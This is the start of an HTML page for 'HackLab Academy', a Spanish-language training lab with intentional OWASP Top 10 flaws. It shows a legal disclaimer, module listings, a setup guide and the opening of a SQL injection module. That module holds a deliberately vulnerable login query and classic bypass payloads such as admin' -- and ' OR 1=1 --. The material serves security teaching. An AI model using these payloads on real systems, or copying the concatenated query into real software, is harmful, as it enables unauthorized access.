@@ -1,0 +1,1864 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackLab Academy — Entorno de Práctica Pentesting Web</title>
+<meta name="description" content="Plataforma educativa de pentesting web con vulnerabilidades intencionales para aprender ethical hacking de forma segura y legal.">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap');
+
+:root {
+  --bg:        #080c14;
+  --surface:   #0e1520;
+  --surface2:  #151f30;
+  --surface3:  #1a2540;
+  --border:    rgba(0,180,255,0.12);
+  --border2:   rgba(0,180,255,0.25);
+  --accent:    #00b4ff;
+  --accent-dim:#0070aa;
+  --red:       #ff3b5c;
+  --red-dim:   #8b1a2e;
+  --green:     #00e676;
+  --green-dim: #00602f;
+  --amber:     #ffab00;
+  --purple:    #b388ff;
+  --text:      #dde6f0;
+  --text2:     #7a90a8;
+  --text3:     #3d5068;
+  --mono:      'JetBrains Mono', monospace;
+  --sans:      'Inter', sans-serif;
+  --radius:    8px;
+  --radius-lg: 14px;
+}
+
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 15px;
+  line-height: 1.6;
+  min-height: 100vh;
+}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--surface3); border-radius: 3px; }
+
+/* ── LEGAL MODAL ── */
+#legal-overlay {
+  position: fixed; inset: 0;
+  background: rgba(0,0,0,0.92);
+  z-index: 9999;
+  display: flex; align-items: center; justify-content: center;
+  padding: 1rem;
+  backdrop-filter: blur(6px);
+}
+
+.legal-box {
+  background: var(--surface);
+  border: 1px solid var(--red);
+  border-radius: var(--radius-lg);
+  max-width: 640px;
+  width: 100%;
+  padding: 2rem;
+  box-shadow: 0 0 60px rgba(255,59,92,0.15);
+}
+
+.legal-box h1 {
+  font-family: var(--mono);
+  font-size: 1.1rem;
+  color: var(--red);
+  letter-spacing: 2px;
+  margin-bottom: 1.2rem;
+  display: flex; align-items: center; gap: 10px;
+}
+
+.legal-items { list-style: none; margin: 1.2rem 0; }
+.legal-items li {
+  padding: 8px 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.88rem;
+  color: var(--text2);
+  display: flex; gap: 10px;
+}
+.legal-items li::before { content: '▸'; color: var(--red); flex-shrink:0; }
+
+.legal-confirm {
+  display: flex; align-items: center; gap: 10px;
+  margin: 1.5rem 0 1.2rem;
+  font-size: 0.85rem;
+}
+
+.legal-confirm input { width: 18px; height: 18px; cursor: pointer; accent-color: var(--accent); }
+
+#btn-accept {
+  width: 100%;
+  background: var(--red);
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: var(--radius);
+  font-family: var(--mono);
+  font-size: 0.9rem;
+  letter-spacing: 1px;
+  cursor: pointer;
+  opacity: 0.4;
+  transition: opacity 0.2s;
+}
+#btn-accept.ready { opacity: 1; }
+#btn-accept.ready:hover { background: #cc2244; }
+
+/* ── HEADER ── */
+header {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 0 2rem;
+  height: 56px;
+  display: flex; align-items: center; justify-content: space-between;
+  position: sticky; top: 0; z-index: 100;
+}
+
+.logo {
+  font-family: var(--mono);
+  font-size: 1.1rem;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 1px;
+}
+.logo span { color: var(--red); }
+
+.header-badges { display: flex; gap: 8px; align-items: center; }
+
+.hbadge {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  padding: 3px 10px;
+  border-radius: 4px;
+  letter-spacing: 1px;
+  font-weight: 600;
+}
+.hbadge.warn { background: rgba(255,59,92,0.15); color: var(--red); border: 1px solid rgba(255,59,92,0.3); }
+.hbadge.edu  { background: rgba(0,180,255,0.10); color: var(--accent); border: 1px solid rgba(0,180,255,0.25); }
+
+/* ── SIDEBAR + LAYOUT ── */
+.app-layout {
+  display: flex;
+  min-height: calc(100vh - 56px);
+}
+
+aside {
+  width: 230px;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  flex-shrink: 0;
+  overflow-y: auto;
+  position: sticky;
+  top: 56px;
+  height: calc(100vh - 56px);
+}
+
+.aside-section {
+  padding: 1.2rem 1rem 0.5rem;
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  color: var(--text3);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 9px 1rem;
+  cursor: pointer;
+  font-size: 0.85rem;
+  color: var(--text2);
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+  user-select: none;
+}
+.nav-item:hover { color: var(--text); background: var(--surface2); }
+.nav-item.active { color: var(--accent); border-left-color: var(--accent); background: var(--surface2); }
+.nav-item .icon { font-size: 1rem; width: 20px; text-align: center; }
+.nav-item .diff {
+  margin-left: auto;
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  padding: 2px 6px;
+  border-radius: 3px;
+}
+.diff.easy   { background: rgba(0,230,118,0.15); color: var(--green); }
+.diff.medium { background: rgba(255,171,0,0.15);  color: var(--amber); }
+.diff.hard   { background: rgba(255,59,92,0.15);  color: var(--red);   }
+
+.progress-sidebar {
+  padding: 1rem;
+  border-top: 1px solid var(--border);
+  margin-top: auto;
+}
+.prog-label { font-size: 0.75rem; color: var(--text2); margin-bottom: 6px; display:flex; justify-content:space-between; }
+.prog-bar { background: var(--surface3); border-radius: 4px; height: 4px; }
+.prog-fill { background: var(--accent); height: 100%; border-radius: 4px; transition: width 0.4s; }
+
+/* ── MAIN CONTENT ── */
+main {
+  flex: 1;
+  overflow-y: auto;
+  padding: 2rem;
+  max-width: 900px;
+}
+
+.page { display: none; }
+.page.active { display: block; }
+
+/* ── COMPONENTS ── */
+.vuln-banner {
+  background: rgba(255,59,92,0.07);
+  border: 1px solid rgba(255,59,92,0.25);
+  border-radius: var(--radius);
+  padding: 0.9rem 1.2rem;
+  margin-bottom: 1.8rem;
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  color: var(--amber);
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  line-height: 1.5;
+}
+
+.vtag {
+  background: var(--red);
+  color: white;
+  font-size: 0.62rem;
+  padding: 2px 7px;
+  border-radius: 3px;
+  font-weight: 700;
+  white-space: nowrap;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 1.5rem;
+  margin-bottom: 1.5rem;
+}
+
+.card-title {
+  font-family: var(--mono);
+  font-size: 0.85rem;
+  color: var(--accent);
+  letter-spacing: 1px;
+  margin-bottom: 1.2rem;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.card-title::before {
+  content: '//';
+  color: var(--text3);
+}
+
+label {
+  display: block;
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  color: var(--text2);
+  margin-bottom: 5px;
+  letter-spacing: 0.5px;
+}
+
+input[type=text], input[type=password], input[type=email],
+input[type=number], textarea, select {
+  width: 100%;
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  padding: 9px 13px;
+  border-radius: var(--radius);
+  font-family: var(--mono);
+  font-size: 0.85rem;
+  margin-bottom: 1rem;
+  outline: none;
+  transition: border-color 0.2s;
+}
+input:focus, textarea:focus, select:focus { border-color: var(--accent); }
+textarea { resize: vertical; }
+select { cursor: pointer; }
+
+.btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: var(--accent);
+  color: var(--bg);
+  border: none;
+  padding: 9px 20px;
+  border-radius: var(--radius);
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.btn:hover { opacity: 0.85; transform: translateY(-1px); }
+.btn.red { background: var(--red); color: white; }
+.btn.green { background: var(--green); color: var(--bg); }
+.btn.ghost { background: transparent; color: var(--accent); border: 1px solid var(--accent); }
+.btn.sm { padding: 6px 14px; font-size: 0.75rem; }
+
+.output {
+  background: #040810;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 1rem 1.2rem;
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  min-height: 70px;
+  margin-top: 1rem;
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.7;
+  color: var(--text2);
+  transition: border-color 0.3s;
+}
+.output.ok  { border-color: var(--green); color: var(--green); }
+.output.err { border-color: var(--red);   color: var(--red);   }
+.output.inf { border-color: var(--accent);color: var(--accent);}
+.output.warn{ border-color: var(--amber); color: var(--amber); }
+
+.hint {
+  background: rgba(255,171,0,0.05);
+  border-left: 3px solid var(--amber);
+  padding: 0.9rem 1rem;
+  margin-top: 1rem;
+  border-radius: 0 var(--radius) var(--radius) 0;
+  font-family: var(--mono);
+  font-size: 0.78rem;
+  color: var(--amber);
+  line-height: 1.7;
+}
+.hint strong { color: var(--text); }
+.hint code {
+  background: rgba(255,255,255,0.06);
+  padding: 1px 6px;
+  border-radius: 3px;
+  font-size: 0.85em;
+}
+
+.flag-box {
+  display: none;
+  background: rgba(0,230,118,0.07);
+  border: 1px solid var(--green);
+  border-radius: var(--radius);
+  padding: 0.9rem 1.2rem;
+  margin-top: 1rem;
+  font-family: var(--mono);
+  font-size: 0.85rem;
+  color: var(--green);
+}
+
+.theory {
+  background: rgba(0,180,255,0.05);
+  border: 1px solid rgba(0,180,255,0.15);
+  border-radius: var(--radius);
+  padding: 1rem 1.2rem;
+  margin-bottom: 1rem;
+  font-size: 0.85rem;
+  color: var(--text2);
+  line-height: 1.7;
+}
+.theory strong { color: var(--accent); }
+
+.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; }
+@media(max-width:700px) {
+  .grid2 { grid-template-columns: 1fr; }
+  aside { display: none; }
+}
+
+.tab-bar { display: flex; gap: 4px; margin-bottom: 1.2rem; flex-wrap: wrap; }
+.tab {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  color: var(--text2);
+  padding: 6px 14px;
+  border-radius: var(--radius);
+  font-family: var(--mono);
+  font-size: 0.78rem;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.tab:hover { color: var(--text); }
+.tab.active { background: var(--accent-dim); color: var(--accent); border-color: var(--accent); }
+
+.token-box {
+  background: #040810;
+  border: 1px solid var(--border2);
+  border-radius: var(--radius);
+  padding: 0.9rem 1rem;
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  color: var(--accent);
+  word-break: break-all;
+  line-height: 1.6;
+}
+
+.data-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.8rem; margin-top: 0.8rem; }
+.data-table th { background: var(--surface3); color: var(--accent); padding: 7px 12px; text-align:left; font-size:0.7rem; letter-spacing:1px; }
+.data-table td { padding: 7px 12px; border-bottom: 1px solid var(--border); color: var(--text); }
+.data-table tr:hover td { background: var(--surface2); }
+
+/* ── HOME PAGE ── */
+.hero {
+  padding: 2rem 0 1rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 2rem;
+}
+.hero-title {
+  font-family: var(--mono);
+  font-size: 2rem;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 2px;
+  line-height: 1.2;
+}
+.hero-sub { color: var(--text2); margin-top: 0.5rem; font-size: 0.9rem; }
+
+.stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px,1fr)); gap: 1rem; margin-bottom: 2rem; }
+.stat {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 1.2rem;
+  text-align: center;
+}
+.stat-n { font-family: var(--mono); font-size: 1.8rem; color: var(--accent); font-weight: 700; }
+.stat-l { font-size: 0.72rem; color: var(--text3); letter-spacing: 1px; margin-top: 2px; }
+
+.module-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px,1fr)); gap: 1rem; }
+.module-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 1.2rem;
+  cursor: pointer;
+  transition: all 0.2s;
+  position: relative;
+}
+.module-card:hover { border-color: var(--border2); transform: translateY(-2px); background: var(--surface2); }
+.module-card.solved { border-color: rgba(0,230,118,0.3); }
+.module-card .mc-icon { font-size: 1.8rem; margin-bottom: 0.8rem; }
+.module-card h3 { font-family: var(--mono); font-size: 0.85rem; color: var(--text); margin-bottom: 4px; }
+.module-card p { font-size: 0.78rem; color: var(--text2); line-height: 1.5; }
+.module-card .mc-tags { display: flex; gap: 6px; margin-top: 10px; flex-wrap: wrap; }
+.mc-tag { font-family: var(--mono); font-size: 0.62rem; padding: 2px 7px; border-radius: 3px; }
+.mc-tag.owasp { background: rgba(179,136,255,0.15); color: var(--purple); }
+.mc-check {
+  position: absolute; top: 10px; right: 10px;
+  width: 20px; height: 20px;
+  border-radius: 50%;
+  background: rgba(0,230,118,0.2);
+  border: 1px solid var(--green);
+  display: none;
+  align-items: center; justify-content: center;
+  font-size: 0.7rem; color: var(--green);
+}
+.module-card.solved .mc-check { display: flex; }
+
+.steps { list-style:none; counter-reset: step; }
+.steps li {
+  counter-increment: step;
+  padding: 10px 0 10px 40px;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.87rem;
+  color: var(--text2);
+  position: relative;
+}
+.steps li::before {
+  content: counter(step);
+  position: absolute; left: 0; top: 10px;
+  width: 24px; height: 24px;
+  background: var(--surface3);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--mono); font-size: 0.72rem; color: var(--accent);
+}
+
+.tools-list { display: flex; gap: 8px; flex-wrap: wrap; margin: 1rem 0; }
+.tool-chip {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 5px 12px;
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  color: var(--text2);
+}
+</style>
+</head>
+<body>
+
+<!-- ═══════════════ LEGAL MODAL ═══════════════ -->
+<div id="legal-overlay">
+  <div class="legal-box">
+    <h1>⚠ AVISO LEGAL Y ÉTICO — LEER ANTES DE CONTINUAR</h1>
+    <p style="font-size:0.88rem;color:var(--text2);line-height:1.7;">
+      Esta plataforma contiene vulnerabilidades web <strong style="color:var(--text)">intencionales y controladas</strong>, 
+      diseñadas exclusivamente con fines educativos para estudiantes de ciberseguridad y ethical hacking.
+    </p>
+    <ul class="legal-items">
+      <li>Todas las técnicas aprendidas aquí deben aplicarse <strong>ÚNICAMENTE</strong> en sistemas propios o con autorización escrita explícita del propietario.</li>
+      <li>Atacar sistemas sin permiso es un <strong>delito penal</strong> en la mayoría de países (Ley 1273 en Colombia, CFAA en EE.UU., Directiva NIS2 en Europa).</li>
+      <li>Esta plataforma es un <strong>entorno simulado</strong>. Los datos mostrados son ficticios y no representan personas o sistemas reales.</li>
+      <li>El conocimiento aquí adquirido debe usarse para <strong>defender sistemas</strong>, no para atacarlos sin autorización.</li>
+      <li>El autor no se responsabiliza por el uso indebido de estas técnicas.</li>
+    </ul>
+    <div class="legal-confirm">
+      <input type="checkbox" id="legal-check" onchange="document.getElementById('btn-accept').classList.toggle('ready',this.checked)">
+      <label for="legal-check" style="display:inline;color:var(--text);font-size:0.85rem;cursor:pointer;">
+        Entiendo que esto es solo para <strong>aprendizaje ético</strong> y me comprometo a usar este conocimiento de forma responsable y legal.
+      </label>
+    </div>
+    <button id="btn-accept" onclick="acceptLegal()">ACEPTO — INGRESAR AL LABORATORIO</button>
+  </div>
+</div>
+
+<!-- ═══════════════ HEADER ═══════════════ -->
+<header>
+  <div class="logo">Hack<span>Lab</span> Academy</div>
+  <div class="header-badges">
+    <span class="hbadge edu">EDUCATIVO</span>
+    <span class="hbadge warn">⚠ SOLO PRÁCTICA</span>
+  </div>
+</header>
+
+<!-- ═══════════════ APP LAYOUT ═══════════════ -->
+<div class="app-layout">
+
+  <!-- SIDEBAR -->
+  <aside>
+    <div class="aside-section">Inicio</div>
+    <div class="nav-item active" onclick="showPage('home')" id="nav-home">
+      <span class="icon">🏠</span> Dashboard
+    </div>
+    <div class="nav-item" onclick="showPage('guide')" id="nav-guide">
+      <span class="icon">📖</span> Guía de Inicio
+    </div>
+
+    <div class="aside-section">Módulos OWASP</div>
+    <div class="nav-item" onclick="showPage('sqli')" id="nav-sqli">
+      <span class="icon">💉</span> SQL Injection <span class="diff easy">FÁCIL</span>
+    </div>
+    <div class="nav-item" onclick="showPage('xss')" id="nav-xss">
+      <span class="icon">🕸</span> XSS <span class="diff easy">FÁCIL</span>
+    </div>
+    <div class="nav-item" onclick="showPage('auth')" id="nav-auth">
+      <span class="icon">🔓</span> Auth Bypass <span class="diff easy">FÁCIL</span>
+    </div>
+    <div class="nav-item" onclick="showPage('idor')" id="nav-idor">
+      <span class="icon">📂</span> IDOR <span class="diff medium">MEDIO</span>
+    </div>
+    <div class="nav-item" onclick="showPage('jwt')" id="nav-jwt">
+      <span class="icon">🔑</span> JWT Attacks <span class="diff medium">MEDIO</span>
+    </div>
+    <div class="nav-item" onclick="showPage('cmdi')" id="nav-cmdi">
+      <span class="icon">💻</span> Cmd Injection <span class="diff medium">MEDIO</span>
+    </div>
+    <div class="nav-item" onclick="showPage('ssrf')" id="nav-ssrf">
+      <span class="icon">🌐</span> SSRF <span class="diff hard">DIFÍCIL</span>
+    </div>
+    <div class="nav-item" onclick="showPage('xxe')" id="nav-xxe">
+      <span class="icon">📄</span> XXE Injection <span class="diff hard">DIFÍCIL</span>
+    </div>
+    <div class="nav-item" onclick="showPage('csrf')" id="nav-csrf">
+      <span class="icon">🔄</span> CSRF <span class="diff medium">MEDIO</span>
+    </div>
+    <div class="nav-item" onclick="showPage('lfi')" id="nav-lfi">
+      <span class="icon">📁</span> LFI / Path Traversal <span class="diff medium">MEDIO</span>
+    </div>
+
+    <div style="padding:1rem;margin-top:auto;border-top:1px solid var(--border);">
+      <div style="font-size:0.72rem;color:var(--text2);margin-bottom:6px;display:flex;justify-content:space-between;">
+        <span>Progreso</span><span id="prog-txt">0/10</span>
+      </div>
+      <div class="prog-bar"><div class="prog-fill" id="prog-fill" style="width:0%"></div></div>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main>
+
+    <!-- ══ HOME ══ -->
+    <div class="page active" id="page-home">
+      <div class="hero">
+        <div class="hero-title">// HACKLAB ACADEMY</div>
+        <div class="hero-sub">Plataforma de práctica en pentesting web — OWASP Top 10 · Ethical Hacking</div>
+      </div>
+
+      <div class="stat-grid">
+        <div class="stat"><div class="stat-n">10</div><div class="stat-l">MÓDULOS</div></div>
+        <div class="stat"><div class="stat-n" id="solved-n">0</div><div class="stat-l">RESUELTOS</div></div>
+        <div class="stat"><div class="stat-n" style="color:var(--amber)">OWASP</div><div class="stat-l">TOP 10 2021</div></div>
+        <div class="stat"><div class="stat-n" style="color:var(--green)">FREE</div><div class="stat-l">100% GRATIS</div></div>
+      </div>
+
+      <div class="card" style="border-color:rgba(255,59,92,0.3);background:rgba(255,59,92,0.04);">
+        <div class="card-title" style="color:var(--red)">AVISO IMPORTANTE</div>
+        <p style="font-size:0.87rem;color:var(--text2);line-height:1.7;">
+          Esta plataforma es un <strong style="color:var(--text)">entorno de práctica legal y educativo</strong>. 
+          Todas las vulnerabilidades son simuladas en el navegador. No hay servidores reales comprometidos. 
+          Úsala para aprender, certificarte y mejorar tus habilidades defensivas.
+          <br><br>
+          <strong style="color:var(--red)">NUNCA apliques estas técnicas en sistemas sin autorización escrita.</strong>
+        </p>
+      </div>
+
+      <h2 style="font-family:var(--mono);font-size:0.9rem;color:var(--text2);letter-spacing:2px;margin-bottom:1rem;">// MÓDULOS DISPONIBLES</h2>
+      <div class="module-grid">
+        <div class="module-card" id="mc-sqli" onclick="showPage('sqli')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">💉</div>
+          <h3>SQL Injection</h3>
+          <p>Login bypass, UNION attacks, extracción de datos, blind SQLi</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A03:2021</span>
+            <span class="diff easy" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">FÁCIL</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-xss" onclick="showPage('xss')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">🕸</div>
+          <h3>Cross-Site Scripting</h3>
+          <p>XSS reflejado, almacenado, DOM-based, robo de cookies</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A03:2021</span>
+            <span class="diff easy" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">FÁCIL</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-auth" onclick="showPage('auth')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">🔓</div>
+          <h3>Autenticación Rota</h3>
+          <p>Credenciales débiles, fuerza bruta, manipulación de sesión</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A07:2021</span>
+            <span class="diff easy" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">FÁCIL</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-idor" onclick="showPage('idor')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">📂</div>
+          <h3>IDOR</h3>
+          <p>Acceso a objetos directos sin autorización, escalada horizontal</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A01:2021</span>
+            <span class="diff medium" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">MEDIO</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-jwt" onclick="showPage('jwt')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">🔑</div>
+          <h3>JWT Attacks</h3>
+          <p>Alg:none, secret débil, falsificación de tokens, kid injection</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A02:2021</span>
+            <span class="diff medium" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">MEDIO</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-cmdi" onclick="showPage('cmdi')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">💻</div>
+          <h3>Command Injection</h3>
+          <p>OS command injection, encadenamiento, bypass de filtros</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A03:2021</span>
+            <span class="diff medium" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">MEDIO</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-ssrf" onclick="showPage('ssrf')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">🌐</div>
+          <h3>SSRF</h3>
+          <p>Server-Side Request Forgery, acceso a servicios internos</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A10:2021</span>
+            <span class="diff hard" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">DIFÍCIL</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-xxe" onclick="showPage('xxe')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">📄</div>
+          <h3>XXE Injection</h3>
+          <p>XML External Entity, lectura de archivos, SSRF via XXE</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A05:2021</span>
+            <span class="diff hard" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">DIFÍCIL</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-csrf" onclick="showPage('csrf')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">🔄</div>
+          <h3>CSRF</h3>
+          <p>Cross-Site Request Forgery, tokens débiles, bypass SameSite</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A01:2021</span>
+            <span class="diff medium" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">MEDIO</span>
+          </div>
+        </div>
+        <div class="module-card" id="mc-lfi" onclick="showPage('lfi')">
+          <div class="mc-check">✓</div>
+          <div class="mc-icon">📁</div>
+          <h3>LFI / Path Traversal</h3>
+          <p>Local File Inclusion, directory traversal, lectura de archivos del sistema</p>
+          <div class="mc-tags">
+            <span class="mc-tag owasp">A01:2021</span>
+            <span class="diff medium" style="border-radius:3px;padding:2px 7px;font-size:0.62rem;">MEDIO</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ GUIDE ══ -->
+    <div class="page" id="page-guide">
+      <div class="card-title" style="font-family:var(--mono);font-size:1rem;color:var(--accent);margin-bottom:1.5rem;">// GUÍA DE INICIO RÁPIDO</div>
+
+      <div class="card">
+        <div class="card-title">¿QUÉ ES ESTE LABORATORIO?</div>
+        <div class="theory">
+          HackLab Academy es un entorno de práctica web con <strong>vulnerabilidades intencionalmente introducidas</strong> 
+          para que puedas aprender pentesting web de forma segura y legal. Cada módulo simula una vulnerabilidad 
+          real del <strong>OWASP Top 10 2021</strong>, el estándar de referencia en seguridad web mundial.
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">HERRAMIENTAS RECOMENDADAS (KALI LINUX)</div>
+        <div class="tools-list">
+          <div class="tool-chip">🔍 Burp Suite</div>
+          <div class="tool-chip">💉 sqlmap</div>
+          <div class="tool-chip">🕸 nikto</div>
+          <div class="tool-chip">📡 curl</div>
+          <div class="tool-chip">🦊 Firefox + DevTools</div>
+          <div class="tool-chip">🔐 hashcat</div>
+          <div class="tool-chip">📋 gobuster</div>
+          <div class="tool-chip">🐍 Python</div>
+        </div>
+        <div class="hint">
+          <strong>Cómo servir localmente en Kali:</strong><br>
+          <code>python3 -m http.server 8080</code><br>
+          Luego visita: <code>http://localhost:8080</code><br>
+          Burp Suite intercepta en: <code>127.0.0.1:8080</code>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">METODOLOGÍA DE ATAQUE</div>
+        <ol class="steps">
+          <li><strong style="color:var(--text)">Reconocimiento</strong> — Entiende el módulo, lee la teoría y las pistas disponibles</li>
+          <li><strong style="color:var(--text)">Identificar el vector</strong> — ¿Qué input acepta? ¿Qué parámetros se envían?</li>
+          <li><strong style="color:var(--text)">Crafting del payload</strong> — Construye el payload adecuado para la vulnerabilidad</li>
+          <li><strong style="color:var(--text)">Explotar</strong> — Lanza el ataque y observa la respuesta del servidor</li>
+          <li><strong style="color:var(--text)">Captura la flag</strong> — Confirma el éxito con la flag del reto</li>
+          <li><strong style="color:var(--text)">Remediación</strong> — Aprende cómo se parchea esta vulnerabilidad</li>
+        </ol>
+      </div>
+
+      <div class="card">
+        <div class="card-title">RUTAS DE APRENDIZAJE</div>
+        <div class="grid2">
+          <div class="theory">
+            <strong>Principiante</strong><br>
+            SQL Injection → XSS → Auth Bypass → IDOR<br>
+            <span style="color:var(--text3);font-size:0.8rem;">Empieza aquí si eres nuevo en pentesting</span>
+          </div>
+          <div class="theory">
+            <strong>Intermedio</strong><br>
+            JWT → Command Injection → CSRF → LFI<br>
+            <span style="color:var(--text3);font-size:0.8rem;">Ya conoces las bases, sube el nivel</span>
+          </div>
+          <div class="theory">
+            <strong>Avanzado</strong><br>
+            SSRF → XXE → Chaining attacks<br>
+            <span style="color:var(--text3);font-size:0.8rem;">Combina vulnerabilidades para mayor impacto</span>
+          </div>
+          <div class="theory">
+            <strong>Certificaciones</strong><br>
+            CEH · OSCP · eJPT · CompTIA PenTest+<br>
+            <span style="color:var(--text3);font-size:0.8rem;">Este lab cubre el contenido de estos exámenes</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="card" style="border-color:rgba(0,230,118,0.2)">
+        <div class="card-title" style="color:var(--green)">PLATAFORMAS PARA SEGUIR PRACTICANDO</div>
+        <div class="theory">
+          <strong>Gratuitas:</strong> HackTheBox (free tier) · TryHackMe · DVWA · WebGoat · PentesterLab<br>
+          <strong>CTFs:</strong> PicoCTF · CTFtime.org · HackTheBox CTF<br>
+          <strong>Bug Bounty:</strong> HackerOne · Bugcrowd · Intigriti (para ganar dinero legal)
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ SQL INJECTION ══ -->
+    <div class="page" id="page-sqli">
+      <div class="vuln-banner"><span class="vtag">A03:2021</span>
+        SQL Injection — El input del usuario se concatena directamente en consultas SQL sin sanitización ni prepared statements.
+      </div>
+
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>¿Qué es?</strong> SQL Injection ocurre cuando datos no confiables son enviados a un intérprete SQL como parte de un comando. 
+          Un atacante puede leer, modificar o eliminar datos de la base de datos, bypassear autenticación, y en algunos casos ejecutar comandos del SO.<br><br>
+          <strong>Impacto:</strong> Crítico — CVSS hasta 10.0<br>
+          <strong>Remediación:</strong> Prepared Statements, ORMs, validación de input, WAF
+        </div>
+      </div>
+
+      <div class="tab-bar">
+        <div class="tab active" onclick="sqliTab(0)">Login Bypass</div>
+        <div class="tab" onclick="sqliTab(1)">UNION Attack</div>
+        <div class="tab" onclick="sqliTab(2)">Blind SQLi</div>
+      </div>
+
+      <div id="sqli-t0">
+        <div class="card">
+          <div class="card-title">LOGIN VULNERABLE</div>
+          <p style="font-size:0.82rem;color:var(--text2);margin-bottom:1rem;">Query: <code style="color:var(--accent)">SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'</code></p>
+          <label>Usuario:</label>
+          <input type="text" id="sqli-u" placeholder="admin' -- ">
+          <label>Contraseña:</label>
+          <input type="password" id="sqli-p" placeholder="cualquier cosa">
+          <button class="btn" onclick="sqliLogin()">EJECUTAR LOGIN</button>
+          <div class="output" id="sqli-out">Esperando input...</div>
+          <div class="hint">
+            <strong>PAYLOADS CLÁSICOS:</strong><br>
+            <code>admin' --</code> · <code>' OR '1'='1</code> · <code>' OR 1=1 --</code><br>
